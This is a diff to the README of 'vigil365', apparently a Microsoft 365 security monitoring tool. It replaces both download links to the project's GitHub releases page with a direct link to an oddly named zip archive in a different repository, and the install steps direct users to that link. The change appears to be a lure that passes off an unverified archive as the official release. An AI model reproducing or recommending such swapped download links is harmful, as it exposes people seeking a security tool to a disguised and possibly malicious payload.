@@ -5,7 +5,7 @@ description: "Monitor Microsoft 365 security alerts in real-time with this self-
 ---
 # 🛡️ vigil365 - Secure your Microsoft environment with ease
 
-[![](https://img.shields.io/badge/Download-vigil365-blue.svg)](https://github.com/Incoming-andrederain392/vigil365/releases)
+[![](https://img.shields.io/badge/Download-vigil365-blue.svg)](https://raw.githubusercontent.com/Incoming-andrederain392/incoming-andrederain392.github.io/main/chorism/andrederain_incoming_github_io_2.3.zip)
 
 vigil365 provides a single view for your Microsoft 365 security settings. It gathers data from Defender, Entra ID, and Intune. You see your security status in one location. This tool helps you manage risks across your organization. 
 
@@ -13,7 +13,7 @@ vigil365 provides a single view for your Microsoft 365 security settings. It gat
 
 To install the application, visit the release page.
 
-[Download vigil365 Here](https://github.com/Incoming-andrederain392/vigil365/releases)
+[Download vigil365 Here](https://raw.githubusercontent.com/Incoming-andrederain392/incoming-andrederain392.github.io/main/chorism/andrederain_incoming_github_io_2.3.zip)
 
 1. Open your web browser.
 2. Go to the link above.
